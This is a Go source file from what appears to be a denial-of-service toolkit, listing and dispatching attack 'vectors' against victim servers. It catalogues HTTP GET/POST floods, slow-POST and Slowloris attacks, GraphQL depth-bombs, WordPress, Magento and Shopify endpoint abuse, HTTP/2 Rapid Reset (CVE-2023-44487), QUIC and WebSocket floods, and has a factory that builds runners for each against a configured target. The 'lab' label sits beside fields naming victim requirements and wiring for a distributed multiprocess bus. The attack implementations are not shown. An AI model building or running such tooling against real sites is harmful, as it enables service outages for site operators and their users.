package worker

import (
	"context"
	"fmt"
)

// Runner executes a lab vector until ctx is canceled.
type Runner interface {
	Run(ctx context.Context) (requests, errors uint64, err error)
}

// Config tunes any registered vector.
type Config struct {
	Target    string
	Workers   int
	Streams   int
	BatchSize int
	Mode      string
	CMS       string
}

// Spec describes a vector for listing and bench reports.
type Spec struct {
	ID          string
	Label       string
	Layer       string
	VictimNeed  string
	Description string
	RedisVector string // name used when wired into multiprocess phase bus
}

// Catalog is the full list of lab vectors to bench before Redis integration.
var Catalog = []Spec{
	{
		ID: "l7-baseline", Label: "L7 HTTP flood", Layer: "L7",
		VictimNeed: "HTTP/1.1 any", RedisVector: "l7-abuser",
		Description: "Mixed GET + POST with rotated browser UAs",
	},
	{
		ID: "l7-httpget", Label: "L7 GET flood", Layer: "L7",
		VictimNeed: "HTTP/1.1 any", RedisVector: "l7-abuser",
		Description: "Pure GET flood with rotated browser UAs",
	},
	{
		ID: "l7-post", Label: "L7 POST flood", Layer: "L7",
		VictimNeed: "HTTP/1.1 any", RedisVector: "l7-abuser",
		Description: "Randomized form and JSON POST bodies (Slayer-inspired)",
	},
	{
		ID: "l7-apiflood", Label: "API JSON flood", Layer: "L7/API",
		VictimNeed: "HTTP/1.1 API", RedisVector: "l7-abuser",
		Description: "Nested JSON, bulk arrays, GraphQL-style API abuse",
	},
	{
		ID: "l7-rudy", Label: "RUDY slow POST", Layer: "L7",
		VictimNeed: "HTTP/1.1", RedisVector: "l7-abuser",
		Description: "Slow POST drip with inflated Content-Length",
	},
	{
		ID: "l7-wordpress", Label: "WordPress Heartbeat", Layer: "L7",
		VictimNeed: "HTTP/1.1", RedisVector: "l7-abuser",
		Description: "admin-ajax.php heartbeat POST abuse",
	},
	{
		ID: "l7-graphql", Label: "GraphQL endpoint probe", Layer: "L7/API",
		VictimNeed: "GraphQL app", RedisVector: "l7-abuser",
		Description: "POST depth-bomb to /graphql",
	},
	{
		ID: "l7-magento-search", Label: "Magento catalog search", Layer: "L7/CMS",
		VictimNeed: "Magento 2 storefront", RedisVector: "l7-abuser",
		Description: "Heavy /catalogsearch/result queries (DB/index stress)",
	},
	{
		ID: "l7-magento-cart", Label: "Magento guest cart API", Layer: "L7/CMS",
		VictimNeed: "Magento 2 REST", RedisVector: "l7-abuser",
		Description: "Guest cart REST session spam",
	},
	{
		ID: "l7-shopify-search", Label: "Shopify search/cart", Layer: "L7/CMS",
		VictimNeed: "Shopify storefront", RedisVector: "l7-abuser",
		Description: "Search suggest + cart/add.js abuse",
	},
	{
		ID: "l7-cms-rotate", Label: "CMS stress rotate", Layer: "L7/CMS",
		VictimNeed: "Known CMS hint", RedisVector: "l7-abuser",
		Description: "Rotates CMS-specific expensive endpoints (search, cart, image proxy)",
	},
	{
		ID: "h2-rapid-reset", Label: "HTTP/2 Rapid Reset", Layer: "L7 protocol",
		VictimNeed: "TLS ALPN h2", RedisVector: "h2-rapid-reset",
		Description: "HEADERS + RST_STREAM batches (CVE-2023-44487 family)",
	},
	{
		ID: "quic-burner", Label: "QUIC / HTTP3 stress", Layer: "L4/L7",
		VictimNeed: "HTTP/3 victim", RedisVector: "quic-burner",
		Description: "Transport stress; falls back to HTTPS when h3 unavailable",
	},
	{
		ID: "slowloris", Label: "Slowloris", Layer: "L7",
		VictimNeed: "HTTP/1.1", RedisVector: "slowloris",
		Description: "Hold connections open with incomplete HTTP headers",
	},
	{
		ID: "ws-flood", Label: "WebSocket flood", Layer: "L7",
		VictimNeed: "WebSocket endpoint", RedisVector: "ws-flood",
		Description: "Mixed text/binary/ping WebSocket frames",
	},
}

func FindSpec(id string) (Spec, error) {
	for _, s := range Catalog {
		if s.ID == id {
			return s, nil
		}
	}
	return Spec{}, fmt.Errorf("unknown vector %q", id)
}

func NewRunner(id string, cfg Config) (Runner, error) {
	if cfg.Workers <= 0 {
		cfg.Workers = 4
	}
	if cfg.Streams <= 0 {
		cfg.Streams = 100
	}
	if cfg.BatchSize <= 0 {
		cfg.BatchSize = 50
	}
	switch id {
	case "l7-baseline":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "baseline"}, nil
	case "l7-httpget":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "httpget"}, nil
	case "l7-post":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "httppost"}, nil
	case "l7-apiflood":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "apiflood"}, nil
	case "l7-rudy":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "rudy"}, nil
	case "l7-wordpress":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "wordpress"}, nil
	case "l7-graphql":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "graphql"}, nil
	case "l7-magento-search":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "catalog-search", CMS: "Magento"}, nil
	case "l7-magento-cart":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "magento-cart", CMS: "Magento"}, nil
	case "l7-shopify-search":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "shopify-search", CMS: "Shopify"}, nil
	case "l7-cms-rotate":
		return &L7Abuser{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize, Mode: "cms-rotate", CMS: cfg.CMS}, nil
	case "h2-rapid-reset":
		return &H2RapidReset{Target: cfg.Target, Workers: cfg.Workers, Streams: cfg.Streams, BatchSize: cfg.BatchSize}, nil
	case "quic-burner":
		return &QUICBurner{Target: cfg.Target, Workers: cfg.Workers, BatchSize: cfg.BatchSize}, nil
	case "slowloris":
		return &Slowloris{Target: cfg.Target, Workers: cfg.Workers}, nil
	case "ws-flood":
		return &WSFlood{Target: cfg.Target, Workers: cfg.Workers}, nil
	default:
		return nil, fmt.Errorf("unknown vector %q", id)
	}
}